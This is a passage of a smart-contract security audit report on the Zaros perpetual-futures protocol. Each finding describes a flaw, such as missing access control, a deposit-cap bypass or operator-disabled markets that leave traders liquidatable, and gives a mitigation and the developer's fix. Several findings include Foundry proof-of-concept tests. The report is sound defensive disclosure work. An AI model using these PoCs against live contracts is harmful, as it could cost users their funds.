**Zaros:** Fixed in commits [c927d94](https://github.com/zaros-labs/zaros-core/commit/c927d94d20f74c6c4e5bc7b7cca1038a6a7aa5e9) & [0ddd913](https://github.com/zaros-labs/zaros-core/commit/0ddd913eb9d8c7ac440f2814db8bff476f827c7b#diff-dc206ca4ca1f5e661061478ee4bd43c0c979d77a1ce1e0f30745d766bcd65394R42-R53).

**Cyfrin:** Verified.


### `ChainlinkUtil::getPrice` will use incorrect price when underlying aggregator reaches `minAnswer`

**Description:** Chainlink price feeds have in-built minimum & maximum prices they will return; if due to an unexpected event an assets value falls below the price feeds minimum price, [the oracle price feed will continue to report the (now incorrect) minimum price](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac).

[`ChainlinkUtil::getPrice`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/external/chainlink/ChainlinkUtil.sol#L32-L33) doesn't handle this case.

**Impact:** Code will execute with prices that dont reflect the current pricing resulting in a potential loss of funds for users.

**Recommended Mitigation:** Revert unless `minAnswer < answer < maxAnswer`.

**Zaros:** Fixed in commits [b14b208](https://github.com/zaros-labs/zaros-core/commit/c927d94d20f74c6c4e5bc7b7cca1038a6a7aa5e9) & [4a5e53c](https://github.com/zaros-labs/zaros-core/commit/4a5e53c9c0f32e9b6d7e84a20cc47a9f6024def6#).

**Cyfrin:** Verified.


### Users can easily bypass collateral `depositCap` limit using multiple deposits under the limit

**Description:** Margin collateral has a `depositCap` configuration to limit the total deposited amount for a particular collateral type.

But validation in `_requireEnoughDepositCap()` reverts when the current amount being deposited is greater than `depositCap`.

```solidity
function _requireEnoughDepositCap(address collateralType, UD60x18 amount, UD60x18 depositCap) internal pure {
    if (amount.gt(depositCap)) {
        revert Errors.DepositCap(collateralType, amount.intoUint256(), depositCap.intoUint256());
    }
}
```

As it doesn't check the total deposited amount for that collateral type, users can deposit as much as they want by using separate transactions each being under `depositCap`.

**Impact:** Users can deposit more margin collateral than `depositCap`.

**Recommended Mitigation:** `_requireEnoughDepositCap` should check if the total deposited amount for that collateral type plus the new deposit is not greater than `depositCap`.

**Zaros:** Fixed in commit [0d37299](https://github.com/zaros-labs/zaros-core/commit/0d37299f6d5037afc9863dc6f0ae3871784ce376).

**Cyfrin:** Verified.


### Anyone can cancel traders' market orders due to missing access control in `OrderBranch::cancelMarketOrder`

**Description:** Anyone can cancel traders' market orders due to missing access control in `OrderBranch::cancelMarketOrder`:

```solidity
function cancelMarketOrder(uint128 tradingAccountId) external {
    MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

    marketOrder.clear();

    emit LogCancelMarketOrder(msg.sender, tradingAccountId);
}
```

**Impact:** Anyone can cancel traders' market orders.

**Recommended Mitigation:** `OrderBranch::cancelMarketOrder` should check if the caller is an owner of the trading account.

```diff
    function cancelMarketOrder(uint128 tradingAccountId) external {
+       TradingAccount.loadExistingAccountAndVerifySender(tradingAccountId);

        MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

        marketOrder.clear();

        emit LogCancelMarketOrder(msg.sender, tradingAccountId);
    }
```

**Zaros:** Fixed in commit [d37c37a](https://github.com/zaros-labs/zaros-core/commit/d37c37abab40bfa2320c6925c359faa501577eb3).

**Cyfrin:** Verified.


### Protocol operator can disable market with open positions, making it impossible for traders to close their open positions but still subjecting them to potential liquidation

**Description:** `GlobalConfigurationBranch::updatePerpMarketStatus` allows the protocol operator to disable markets without checking if those markets have open positions; this allows the operator to disable a market with open positions.

**Impact:** The protocol can enter a state where traders who previously opened leveraged positions in a market are subsequently unable to close those positions. However these positions are still subject to liquidation since the liquidation code continues to function even when markets are disabled.

Hence the protocol can enter a state where traders are unfairly severely disadvantaged; unable to close their open leveraged positions but still subject to liquidation if the market moves against them.

**Proof of Concept:** Add the following PoC to `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`:
```solidity
function test_ImpossibleToClosePositionIfMarkedDisabledButStillLiquidatable() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // protocol operator disables the BTC market
    changePrank({ msgSender: users.owner });
    perpsEngine.updatePerpMarketStatus({ marketId: BTC_USD_MARKET_ID, enable: false });

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // naruto attmpts to close their opened leverage BTC position but it
    // reverts with PerpMarketDisabled error. However the position is still
    // subject to liquidation!
    //
    // after running this test the first time to verify it reverts with PerpMarketDisabled,
    // comment out this next line then re-run test to see Naruto can be liquidated
    // even though Naruto can't close their open position - very unfair!
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // make BTC position liquidatable
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // liquidate naruto - works fine! naruto was liquidated even though
    // they couldn't close their position!
    changePrank({ msgSender: liquidationKeeper });
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

Run with: `forge test --match-test test_ImpossibleToClosePositionIfMarkedDisabledButStillLiquidatable -vvv`

**Recommended Mitigation:** Liquidation should always be possible so it wouldn't be a good idea to prevent liquidation on disabled markets. Two potential options:
* Prevent disabling markets with open positions
* Allow users to close their open positions in disabled markets

**Zaros:** Fixed in commit [65b08f0](https://github.com/zaros-labs/zaros-core/commit/65b08f0e6b9187b251dfdc89dda08bc72b06e345).

**Cyfrin:** Verified.


### Liquidation leaves traders with unhealthier and riskier collateral basket, making them more likely to be liquidated in future trades

**Description:** The protocol's proposed collateral priority queue with associated Loan-To-Value (LTV) is:
```
1 - USDz   - 1e18 LTV
2 - USDC   - 1e18 LTV
3 - WETH   - 0.8e18 LTV
4 - WBTC   - 0.8e18 LTV
5 - wstETH - 0.7e18 LTV
6 - weETH  - 0.7e18 LTV
```

This means that the protocol will:
* first liquidate the more stable collateral with higher LTV
* only after these have been exhausted will it liquidate the less stable, riskier collaterals with lower LTV

**Impact:** When a trader is liquidated, their resulting collateral basket will contain less stable, more riskier collateral. This makes it more likely they will be liquidated in future trades.

**Recommended Mitigation:** The collateral priority queue should first liquidate riskier, more volatile collateral with lower LTV.

**Zaros:** Fixed in commit [5baa628](https://github.com/zaros-labs/zaros-core/commit/5baa628979d6d33ca042dfca2444c4403393b427).

**Cyfrin:** Verified.


### Keeper fills market order using incorrect old `marketId` but newly updated position size when trader updates open order immediately before keeper processes original order

**Description:** Consider the following scenario:
1) A trader creates an order for the BTC market with position size POS_SIZE_A
2) Some time passes and the order is not filled by the keeper
3) At the same time:
3a) The keeper attempts to fill the trader's current open BTC order
3b) The trader creates a transaction to update their order to a different market with position size POS_SIZE_B

If 3b) is executed before 3a) then when 3a) is executed the keeper will fill the order:
* for the incorrect old BTC market
* but with the newly updated position size POS_SIZE_B!

**Impact:** The keeper will fill the order for an incorrect market with an incorrect position size.

**Proof of Concept:** Add the PoC to `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`:
```solidity
// additional import at top
import { Position } from "@zaros/perpetuals/leaves/Position.sol";

function test_KeeperFillsOrderToIncorrectMarketAfterUserUpdatesOpenOrder() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto creates an open order in the BTC market
    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: tradingAccountId,
            marketId: BTC_USD_MARKET_ID,
            sizeDelta: USER_POS_SIZE_DELTA
        })
    );

    // some time passes and the order is not filled
    vm.warp(block.timestamp + MARKET_ORDER_MAX_LIFETIME + 1);

    // at the same time:
    // 1) keeper creates a transaction to fill naruto's open BTC order
    // 2) naruto updates their open order to place it on ETH market

    // 2) gets executed first; naruto changes position size and market id
    int128  USER_POS_2_SIZE_DELTA = 5e18;

    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: tradingAccountId,
            marketId: ETH_USD_MARKET_ID,
            sizeDelta: USER_POS_2_SIZE_DELTA
        })
    );

    // 1) gets executed afterwards - the keeper is calling this
    // with the parameters of the first opened order, in this case
    // with BTC's market id and price !
    bytes memory mockSignedReport = getMockedSignedReport(BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE);
    changePrank({ msgSender: marketOrderKeepers[BTC_USD_MARKET_ID] });
    perpsEngine.fillMarketOrder(tradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);

    // the keeper filled Naruto's original BTC order even though
    // Naruto had first updated the order to be for the ETH market;
    // Naruto now has an open BTC position. Also it was filled using
    // the *updated* order size!
    changePrank({ msgSender: users.naruto });

    // load naruto's position for BTC market
    Position.State memory positionState = perpsEngine.getPositionState(tradingAccountId, BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE);

    // verify that the position size of the filled BTC position
    // matches the size of the updated ETH order!
    assertEq(USER_POS_2_SIZE_DELTA, positionState.sizeX18.intoInt256());
}
```

Run with: `forge test --match-test test_KeeperFillsOrderToIncorrectMarketAfterUserUpdatesOpenOrder -vvv`

**Recommended Mitigation:** `SettlementBranch::fillMarketOrder` should revert if `marketId != marketOrder.marketId`.

**Zaros:** Fixed in commit [31a19ef](https://github.com/zaros-labs/zaros-core/commit/31a19ef9113aed94e291160e7eaf5fc399671170#diff-572572bb95cc7c9ffd3c366fe793b714965688505695c496cf74bed94c8cc976R57-R60).

**Cyfrin:** Verified.


### `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd` uses incorrect price during order settlement

**Description:** During order settlement `SettlementBranch::_fillOrder` uses an off-chain price provided by the keeper:

```solidity
File: SettlementBranch.sol
120:         ctx.fillPrice = perpMarket.getMarkPrice(
121:             ctx.sizeDelta, settlementConfiguration.verifyOffchainPrice(priceData, ctx.sizeDelta.gt(SD_ZERO))
122:         );
123:
124:         ctx.fundingRate = perpMarket.getCurrentFundingRate();
125:         ctx.fundingFeePerUnit = perpMarket.getNextFundingFeePerUnit(ctx.fundingRate, ctx.fillPrice);
```

All variables including `ctx.fillPrice` and `ctx.fundingFeePerUnit` are calculated based on this price.

But during the margin requirement validation in `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd` the price input provided by the keeper is not used, instead this uses an index price:

```solidity
File: TradingAccount.sol
207:             UD60x18 markPrice = perpMarket.getMarkPrice(sizeDeltaX18, perpMarket.getIndexPrice());
208:             SD59x18 fundingFeePerUnit =
209:                 perpMarket.getNextFundingFeePerUnit(perpMarket.getCurrentFundingRate(), markPrice);
```

**Impact:** All calculations in `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd` may be incorrect as the price provided by the keeper may differ from the current index price. Hence during an order settlement `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd` may return incorrect outputs.

**Recommended Mitigation:** During order settlement `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd` should use the same off-chain price for `targetMarketId` provided by the keeper.

**Zaros:** Acknowledged; this is something we will refactor in V2. In practice the difference is negligible; in the "worst-case" scenario what could happen is that an order would be filled even though the user was slightly under the initial margin requirement. While not desirable, the user would not be subject to immediate liquidation as that occurs at the maintenance margin, so the impact here appears very minimal.


### Protocol operator can disable settlement for market with open positions, making it impossible for traders to close their open positions but still subjecting them to potential liquidation

**Description:** `GlobalConfiguration::updateSettlementConfiguration` allows the protocol operator to disable settlement for markets without checking if those markets have open positions; this allows the operator to disable settlement for a market with open positions.

**Impact:** The protocol can enter a state where traders who previously opened leveraged positions in a market are subsequently unable to close those positions. However these positions are still subject to liquidation since the liquidation code continues to function even when settlement is disabled.

Hence the protocol can enter a state where traders are unfairly severely disadvantaged; unable to close their open leveraged positions but still subject to liquidation if the market moves against them.

**Proof of Concept:** Add the following PoC to `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`:
```solidity
// new import at top
import { IVerifierProxy } from "@zaros/external/chainlink/interfaces/IVerifierProxy.sol";

function test_ImpossibleToClosePositionIfSettlementDisabledButStillLiquidatable() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // protocol operator disables settlement for the BTC market
    changePrank({ msgSender: users.owner });

    SettlementConfiguration.DataStreamsStrategy memory marketOrderConfigurationData = SettlementConfiguration
        .DataStreamsStrategy({ chainlinkVerifier: IVerifierProxy(mockChainlinkVerifier), streamId: BTC_USD_STREAM_ID });

    SettlementConfiguration.Data memory marketOrderConfiguration = SettlementConfiguration.Data({
        strategy: SettlementConfiguration.Strategy.DATA_STREAMS_ONCHAIN,
        isEnabled: false,
        fee: DEFAULT_SETTLEMENT_FEE,
        keeper: marketOrderKeepers[BTC_USD_MARKET_ID],
        data: abi.encode(marketOrderConfigurationData)
    });

    perpsEngine.updateSettlementConfiguration(BTC_USD_MARKET_ID,
                                              SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
                                              marketOrderConfiguration);

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // naruto attmpts to close their opened leverage BTC position but it
    // reverts with PerpMarketDisabled error. However the position is still
    // subject to liquidation!
    //
    // after running this test the first time to verify it reverts with SettlementDisabled,
    // comment out this next line then re-run test to see Naruto can be liquidated
    // even though Naruto can't close their open position - very unfair!
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // make BTC position liquidatable
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // liquidate naruto - works fine! naruto was liquidated even though
    // they couldn't close their position!
    changePrank({ msgSender: liquidationKeeper });
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

Run with: `forge test --match-test test_ImpossibleToClosePositionIfSettlementDisabledButStillLiquidatable -vvv`

**Recommended Mitigation:** Liquidation should always be possible so it wouldn't be a good idea to prevent liquidation if settlement is disabled. Two potential options:
* Prevent disabling settlement for markets with open positions
* Allow users to close their open positions in markets which have settlement disabled

**Zaros:** Fixed in commit [08d96cf](https://github.com/zaros-labs/zaros-core/commit/08d96cf40c92470454afd4f261b3bc1921845e58).

**Cyfrin:** Verified.


### Update to funding rate parameters retrospectively impacts accrued funding rates

**Description:** On centralized perpetuals protocols funding rates are typically settled every 8 hours however on Zaros they "accrue" and are settled when the trader interacts with their position. The protocol owner also has the power to alter funding rate parameters which when altered apply retrospectively.

**Impact:** Traders who are not frequently modifying their positions can be either positively or negatively retrospectively impacted by changes to the funding rate parameters. The retrospective application is unfair to traders because traders are under the impression that they are accruing funding rates at the current configuration parameters.

**Proof of Concept:** Add the following PoC to `test/integration/order-branch/createMarketOrder/createMarketOrder.t.sol`:
```solidity
function test_configChangeRetrospectivelyImpactsAccruedFundingRates() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // naruto keeps their position open for 1 week
    vm.warp(block.timestamp + 1 weeks);

    // snapshot EVM state at this point
    uint256 snapshotId = vm.snapshot();

    // naruto closes their BTC position
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken),
        perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256());

    // verify that naruto has lost $ due to order/settlement fees
    // and paying funding rate
    uint256 firstEndBalance = usdToken.balanceOf(users.naruto); // 99122 456325000000000000
    assertEq(99122456325000000000000, firstEndBalance);

    // restore EVM state to snapshot
    vm.revertTo(snapshotId);

    // right before naruto closes their position, protocol admin
    // changes parameters which affect the funding rates
    GlobalConfigurationBranch.UpdatePerpMarketConfigurationParams memory params =
        GlobalConfigurationBranch.UpdatePerpMarketConfigurationParams({
        marketId: BTC_USD_MARKET_ID,
        name: marketsConfig[BTC_USD_MARKET_ID].marketName,
        symbol: marketsConfig[BTC_USD_MARKET_ID].marketSymbol,
        priceAdapter: marketsConfig[BTC_USD_MARKET_ID].priceAdapter,
        initialMarginRateX18: marketsConfig[BTC_USD_MARKET_ID].imr,
        maintenanceMarginRateX18: marketsConfig[BTC_USD_MARKET_ID].mmr,
        maxOpenInterest: marketsConfig[BTC_USD_MARKET_ID].maxOi,
        maxSkew: marketsConfig[BTC_USD_MARKET_ID].maxSkew,
        // protocol admin increases max funding velocity
        maxFundingVelocity: BTC_USD_MAX_FUNDING_VELOCITY * 10,
        minTradeSizeX18: marketsConfig[BTC_USD_MARKET_ID].minTradeSize,
        skewScale: marketsConfig[BTC_USD_MARKET_ID].skewScale,
        orderFees: marketsConfig[BTC_USD_MARKET_ID].orderFees
    });

    changePrank({ msgSender: users.owner });
    perpsEngine.updatePerpMarketConfiguration(params);

    // naruto then closes their BTC position
    changePrank({ msgSender: users.naruto });

    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken),
        perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256());

    // verify that naruto has lost $ due to order/settlement fees
    // and paying funding rate
    uint256 secondEndBalance = usdToken.balanceOf(users.naruto); // 98460 923250000000000000
    assertEq(98460923250000000000000, secondEndBalance);

    // the update to the funding configuration parameter was
    // applied retrospectively increasing the funding rate
    // naruto had to pay for holding their position the entire
    // time - rather unfair!
    assert(secondEndBalance < firstEndBalance);
}
```

Run with: `forge test --match-test test_configChangeRetrospectivelyImpactsAccruedFundingRates -vvv`

**Recommended Mitigation:** Ideally funding rates would be settled on a regular interval such as every 8 hours, and before protocol owners changed key funding rate parameters all funding rates for open positions would first be settled.

However this may not be feasible on decentralized systems.

**Zaros:** Acknowledged.


### `SettlementBranch::_fillOrder` doesn't pay order and settlement fees if PNL is positive

**Description:** `SettlementBranch::_fillOrder` while calculating the PNL at L161 deducts these fees from the calculated PNL, but if the PNL is positive later on around L204 it doesn't pay order and settlement fees to the appropriate fee recipients.

```solidity
File: SettlementBranch.sol
159:         ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
160:             oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
161:         ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
...
204:         } else if (ctx.pnl.gt(SD_ZERO)) {
205:             UD60x18 amountToIncrease = ctx.pnl.intoUD60x18();
206:             tradingAccount.deposit(ctx.usdToken, amountToIncrease);
```

**Impact:** Order and settlement fee recipients will receive less funds than intended.

**Recommended Mitigation:** `SettlementBranch::_fillOrder` should pay order and settlement fees to the appropriate recipients when PNL is positive.

**Zaros:** Fixed in commit [516bc2a](https://github.com/zaros-labs/zaros-core/commit/516bc2ad61d64e94654db500a93bd19567ca01e5).

**Cyfrin:** Verified.

\clearpage
## Low Risk


### `TradingAccount::deductAccountMargin` can incorrectly add the same values multiple times to output parameter `marginDeductedUsdX18`

**Description:** In `TradingAccount::deductAccountMargin`, `ctx.settlementFeeDeductedUsdX18`, `ctx.orderFeeDeductedUsdX18`, and `ctx.pnlDeductedUsdX18` are added to `marginDeductedUsdX18` inside the `for` loop:
```solidity
File: TradingAccount.sol
443:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.settlementFeeDeductedUsdX18);
458:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.orderFeeDeductedUsdX18);
475:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.pnlDeductedUsdX18);
```

**Impact:** As those 3 values are accumulated withdrawn collateral amounts, the same amount will be added several times and `marginDeductedUsdX18` will be larger than expected.

**Proof of Concept:** Consider a scenario where:
* the settlement fee `if` statement executes once with `ctx.isMissingMargin == false`
* this then increments `marginDeductedUsdX18` by `ctx.settlementFeeDeductedUsdX18`
* the order fee `if` statement executes once with `ctx.isMissingMargin == true`
* this triggers `continue` which immediately jumps to next loop iteration
* the settlement fee `if` statement is skipped since the settlement fee has been paid
* `marginDeductedUsdX18` is again incremented by `ctx.settlementFeeDeductedUsdX18` !

In this scenario `marginDeductedUsdX18` was incremented twice by `ctx.settlementFeeDeductedUsdX18`. The same thing can happen with `ctx.orderFeeDeductedUsdX18`.

**Recommended Mitigation:** Update `marginDeductedUsdX18` at the end of the function instead of inside the loop:

```solidity
function deductAccountMargin() {
    for (uint256 i = 0; i < globalConfiguration.collateralLiquidationPriority.length(); i++) {
        /* snip: loop processing */
        // @audit removed updates to `marginDeductedUsdX18` during loop
    }

    // @audit update `marginDeductedUsdX18` only once at end of loop
    marginDeductedUsdX18 = ctx.settlementFeeDeductedUsdX18.add(ctx.orderFeeDeductedUsdX18).add(ctx.pnlDeductedUsdX18);
}
```

**Zaros:** Fixed in commit [9bcf9f8](https://github.com/zaros-labs/zaros-core/commit/9bcf9f83d11d8da9113c38f01404985f37dc763d).

**Cyfrin:** Verified.


### `SettlementBranch::_fillOrder` can revert for positions with negative PNL in markets with negative maker/taker fees

**Description:** `SettlementBranch::_fillOrder` calculates the position's PNL as `pnl = (unrealizedPnl + accruedFunding) + (unary(orderFee + settlementFee))`:

```solidity
File: SettlementBranch.sol
141: ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
142:     oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
143:     ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
144:
```

If the PNL is negative, `marginToDeductUsdX18` is calculated by deducting the setttlement/order fees.

```solidity
171: if (ctx.pnl.lt(SD_ZERO)) {
172:     UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
173:     ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
174:     : ctx.pnl.abs().intoUD60x18();
175:
176:     tradingAccount.deductAccountMargin({
177:         feeRecipients: FeeRecipients.Data({
178:         marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
179:         orderFeeRecipient: globalConfiguration.orderFeeRecipient,
180:         settlementFeeRecipient: globalConfiguration.settlementFeeRecipient
181:     }),
182:     pnlUsdX18: marginToDeductUsdX18,
183:     orderFeeUsdX18: ctx.orderFeeUsdX18.gt(SD_ZERO) ? ctx.orderFeeUsdX18.intoUD60x18() : UD_ZERO,
184:     settlementFeeUsdX18: ctx.settlementFeeUsdX18
185:     });
```

As we can see at L183, it assumes `orderFeeUsdX18` could be a negative amount which is possible only when `makerFee/takerFee` is negative.

But during the calculation at L173, it converts `orderFeeUsdX18` to `UD60x18` directly and it will revert with a negative order fee.

```solidity
/// @notice Casts an SD59x18 number into UD60x18.
/// @dev Requirements:
/// - x must be positive.
function intoUD60x18(SD59x18 x) pure returns (UD60x18 result) {
    int256 xInt = SD59x18.unwrap(x);
    if (xInt < 0) {
        revert CastingErrors.PRBMath_SD59x18_IntoUD60x18_Underflow(x);
    }
    result = UD60x18.wrap(uint256(xInt));
}
```

If this revert did not occur, the calculation of `marginToDeductUsdX18` would be incorrect:
```
Normal Case - positive order fee
================================

unrealizedPnl + accruedFunding = -1000, orderFeeUsdX18 = 100, settlementFeeUsdX18 = 200

ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
    oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));

ctx.pnl = -1000 + (unary(100 + 200))
        = -1000 + (unary(300))
        = -1000 - 300
        = -1300

=> ctx.pnl increased by sum of order and settlement fee)


UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
    ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
    : ctx.pnl.abs().intoUD60x18();

marginToDeductUsdX18 = ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
                     = 1300 - (100 + 200)
                     = 1300 - 300
                     = 1000

=> marginToDeductUsdX18 equal to original unrealizedPnl+accruedFunding


Edge Case - negative order fee
==============================

unrealizedPnl + accruedFunding = -1000, orderFeeUsdX18 = -100, settlementFeeUsdX18 = 200

ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
    oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));


ctx.pnl = -1000 + (unary(-100 + 200))
        = -1000 + (unary(100))
        = -1000 - 100
        = -1100

=> ctx.pnl decreased by delta between order fee and settlement fee

UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
    ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
    : ctx.pnl.abs().intoUD60x18();

marginToDeductUsdX18 = ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
                     = 1100 - (100 + 200) // -100 order fee becomes 100 due to non-reverting `intoUD60x18`
                     = 1100 - 300
                     = 800

=> marginToDeductUsdX18 much lower than what should be deducted
```

**Impact:** `SettlementBranch::_fillOrder` might revert unexpectedly.

**Recommended Mitigation:** It has the same mitigation as another low issue - `SettlementBranch::_fillOrder reverts if absolute value of negative PNL is smaller than sum of order and settlement fees` .

**Zaros:** Fixed in commit [e03228e](https://github.com/zaros-labs/zaros-core/commit/d37c37abab40bfa2320c6925c359faa501577eb3) by no longer supporting negative fees; both `makerFee` and `takerFee` are now unsigned.

**Cyfrin:** Verified.


### Remove max open interest check when liquidating in `LiquidationBranch::liquidateAccounts`

**Description:** In `LiquidationBranch::liquidateAccounts` there is no point calling `PerpMarket::checkOpenInterestLimits` since:
* the liquidation will always be decreasing the open interest so the liquidation can't cause the max open interest limit to be breached
* the skew check is not performed

Hence there is no need for this check when liquidating. The danger of having this check is that if the admin sets the max open interest limit below the current open interest then all liquidations will revert.

**Recommended Mitigation:**
```diff
- (ctx.newOpenInterestX18, ctx.newSkewX18) = perpMarket.checkOpenInterestLimits(
-     ctx.liquidationSizeX18, ctx.oldPositionSizeX18, sd59x18(0), false
- );
```

**Zaros:** Fixed in commit [783ea67](https://github.com/zaros-labs/zaros-core/commit/783ea67979b79bce3a74dbaf19e53503034c9349).

**Cyfrin:** Verified.


### Gracefully handle state where perp market `maxOpenInterest` is updated to be smaller than the current open interest

**Description:** `GlobalConfigurationBranch::updatePerpMarketConfiguration` only enforces that `maxOpenInterest != 0` then calls `MarketConfiguration::update` which sets `maxOpenInterest` to an arbitrary non-zero value.

This means that protocol admins can update `maxOpenInterest` to be smaller than the current open interest. This state in turn causes many transactions for that market including liquidations to fail because of the check in `PerpMarket::checkOpenInterestLimits`.

**Recommended Mitigation:** The first option is to prevent `maxOpenInterest` from being updated to be smaller than the current open interest. However there may be a valid reason to do this for example if the protocol admins want to reduce the size of a current market to limit exposure.

